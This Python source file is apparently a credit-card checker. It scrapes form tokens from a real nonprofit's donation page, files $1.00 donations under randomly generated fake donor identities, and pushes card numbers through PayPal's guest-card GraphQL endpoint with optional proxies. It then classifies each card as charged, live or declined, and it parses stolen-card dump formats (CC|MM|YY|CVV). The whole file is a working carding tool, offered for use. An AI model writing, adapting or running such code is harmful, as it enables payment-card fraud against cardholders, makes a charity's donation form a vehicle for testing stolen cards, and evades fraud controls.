import requests
import re
import json
import random
from typing import Dict, Any, Optional

FIRST_NAMES = [
    "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
    "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
    "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
    "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
    "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
]

LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
]

ADDRESSES = [
    {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
    {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
    {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
    {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
    {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
    {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
    {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
    {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
    {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
    {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
]

PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]

def random_donor() -> Dict[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    addr = random.choice(ADDRESSES)
    phone = random.choice(PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
    domain = random.choice(EMAIL_DOMAINS)
    email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
    return {
        "first": first,
        "last": last,
        "email": email,
        "phone": phone,
        "address": addr
    }

class PayPalChargeEngine:
    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.verify = True
        self.last_error = ""
        if proxy:
            if proxy.count(':') == 3 and '@' not in proxy:
                p = proxy.split(':')
                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                self.session.proxies = {"http": fmt, "https": fmt}
            elif '@' in proxy:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            else:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        self.ajax_headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://awwatersheds.org",
            "Referer": "https://awwatersheds.org/donate/",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.tokens = {}

    def scrape_tokens(self) -> bool:
        try:
            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                self.last_error = "Hash not found"
                return False
            self.tokens['hash'] = h.group(1)
            self.tokens['pfx'] = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            self.tokens['id'] = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            return True
        except Exception as e:
            self.last_error = str(e)
            return False

    def register_donation(self, donor: Dict[str, str]) -> bool:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-title": "Sustainers Circle",
            "give-current-url": "https://awwatersheds.org/donate/",
            "give-form-url": "https://awwatersheds.org/donate/",
            "give-form-hash": self.tokens['hash'],
            "give-price-id": "custom",
            "give-amount": "1.00",
            "payment-mode": "paypal-commerce",
            "give_first": donor["first"],
            "give_last": donor["last"],
            "give_email": donor["email"],
            "give-lake-affiliation": "Other",
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true"
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
            return r.status_code == 200
        except:
            return False

    def create_order(self) -> Optional[str]:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-hash": self.tokens['hash'],
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_create_order"},
                headers=self.ajax_headers, data=data, timeout=20
            )
            rj = r.json()
            if rj.get("success") and "data" in rj:
                return rj["data"]["id"]
            return None
        except:
            return None

    @staticmethod
    def detect_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "MASTER_CARD"
        elif n.startswith(("34", "37")): return "AMEX"
        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> str:
        addr = donor["address"]
        graphql_h = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": self.ua,
            "Content-Type": "application/json",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
            "X-Country": "US"
        }

        query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags { is3DSecureRequired }
                cart {
                    intent
                    cartId
                    buyer { userId auth { accessToken } }
                    returnUrl { href }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status method
                        redirectUrl { href }
                        parameter
                    }
                }
            }
        }
        """

        full_yy = card['yy'] if len(card['yy']) == 4 else "20" + card['yy']
        billing = {
            "givenName": donor["first"], "familyName": donor["last"],
            "line1": addr["line1"], "line2": None,
            "city": addr["city"], "state": addr["state"],
            "postalCode": addr["zip"], "country": "US"
        }

        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card["number"],
                "type": self.detect_type(card["number"]),
                "expirationDate": f"{card['mm']}/{full_yy}",
                "postalCode": addr["zip"],
                "securityCode": card["cvc"]
            },
            "phoneNumber": donor["phone"],
            "firstName": donor["first"],
            "lastName": donor["last"],
            "email": donor["email"],
            "billingAddress": billing,
            "shippingAddress": billing,
            "currencyConversionType": "PAYPAL"
        }

        try:
            r = requests.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=graphql_h,
                json={"query": query, "variables": variables},
                timeout=30,
                proxies=self.session.proxies
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"

    def approve_order(self, order_id: str) -> str:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-hash": self.tokens['hash'],
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers=self.ajax_headers, data=data, timeout=30
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"

def analyze_response(paypal_text: str, approve_text: str = "") -> Dict[str, str]:
    t = paypal_text.upper() if paypal_text else ""

    if 'APPROVESTATE":"APPROVED' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
    if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}
    if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}

    if 'CVV2_FAILURE' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
    if 'INVALID_SECURITY_CODE' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "CCN - Invalid Security Code (LIVE)"}
    if 'INVALID_BILLING_ADDRESS' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
    if 'EXISTING_ACCOUNT_RESTRICTED' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}

    if 'INSUFFICIENT_FUNDS' in t:
        return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}

    combined = t + " " + (approve_text.upper() if approve_text else "")
    declines = [
        ('DO_NOT_HONOR',                    'Do Not Honor'),
        ('ACCOUNT_CLOSED',                  'Account Closed'),
        ('PAYER_ACCOUNT_LOCKED_OR_CLOSED',  'Account Locked/Closed'),
        ('LOST_OR_STOLEN',                  'LOST OR STOLEN'),
        ('SUSPECTED_FRAUD',                 'SUSPECTED FRAUD'),
        ('INVALID_ACCOUNT',                 'INVALID ACCOUNT'),
        ('REATTEMPT_NOT_PERMITTED',         'REATTEMPT NOT PERMITTED'),
        ('ACCOUNT_BLOCKED_BY_ISSUER',       'ACCOUNT BLOCKED BY ISSUER'),
        ('ORDER_NOT_APPROVED',              'ORDER NOT APPROVED'),
        ('PICKUP_CARD_SPECIAL_CONDITIONS',  'PICKUP CARD'),
        ('PAYER_CANNOT_PAY',                'PAYER CANNOT PAY'),
        ('GENERIC_DECLINE',                 'GENERIC DECLINE'),
        ('COMPLIANCE_VIOLATION',            'COMPLIANCE VIOLATION'),
        ('TRANSACTION_NOT_PERMITTED',       'TRANSACTION NOT PERMITTED'),
        ('PAYMENT_DENIED',                  'PAYMENT DENIED'),
        ('INVALID_TRANSACTION',             'INVALID TRANSACTION'),
        ('RESTRICTED_OR_INACTIVE_ACCOUNT',  'RESTRICTED/INACTIVE ACCOUNT'),
        ('SECURITY_VIOLATION',              'SECURITY VIOLATION'),
        ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
        ('INVALID_OR_RESTRICTED_CARD',      'INVALID/RESTRICTED CARD'),
        ('EXPIRED_CARD',                    'EXPIRED CARD'),
        ('CRYPTOGRAPHIC_FAILURE',           'CRYPTOGRAPHIC FAILURE'),
        ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
        ('DECLINED_PLEASE_RETRY',           'DECLINED - RETRY LATER'),
        ('TX_ATTEMPTS_EXCEED_LIMIT',        'TX ATTEMPTS EXCEED LIMIT'),
    ]
    for keyword, msg in declines:
        if keyword in combined:
            return {"status": "DECLINED", "emoji": "❌", "msg": msg}

    try:
        rj = json.loads(paypal_text)
        if "errors" in rj:
            return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
    except:
        pass
    try:
        rj = json.loads(approve_text)
        if rj.get("data", {}).get("error"):
            return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
    except:
        pass

    return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}

def parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
    parts = re.split(r'[|:,]', cc_str.strip())
    if len(parts) >= 4:
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        if len(yy) == 2: yy = "20" + yy
        return {"number": cc, "mm": mm, "yy": yy, "cvc": parts[3].strip()}
    return None

def check_card(cc_str: str, proxy: Optional[str] = None) -> Dict[str, str]:
    card = parse_cc(cc_str)
    if not card:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Invalid format (CC|MM|YY|CVV)"}

    donor = random_donor()
    engine = PayPalChargeEngine(proxy=proxy)

    if not engine.scrape_tokens():
        return {"status": "ERROR", "emoji": "⚠️", "msg": f"Token scrape failed: {engine.last_error}"}

    if not engine.register_donation(donor):
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Donation registration failed"}

    order_id = engine.create_order()
    if not order_id:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "PayPal order creation failed"}

    graphql_resp = engine.charge_card(order_id, card, donor)
    approve_resp = engine.approve_order(order_id)

    return analyze_response(graphql_resp, approve_resp)

def chkk(ccx: str) -> str:
    try:
        result = check_card(ccx)
        status = result.get("status", "ERROR")
        msg = result.get("msg", "Unknown")

        if status == "CHARGED":
            return f"Charged 💎 | {msg}"
        elif status == "APPROVED":
            if "CVV2" in msg or "CCN" in msg or "Security" in msg or "security" in msg:
                return "security code is incorrect"
            return f"Approved ✅ | {msg}"
        elif status == "LIVE":
            return f"Funds 💰 | {msg}"
        elif status == "DECLINED":
            return f"DECLINED ❌ | {msg}"
        else:
            return f"ERROR ⚠️ | {msg}"
    except Exception as e:
        return f"ERROR ⚠️ | {str(e)}"
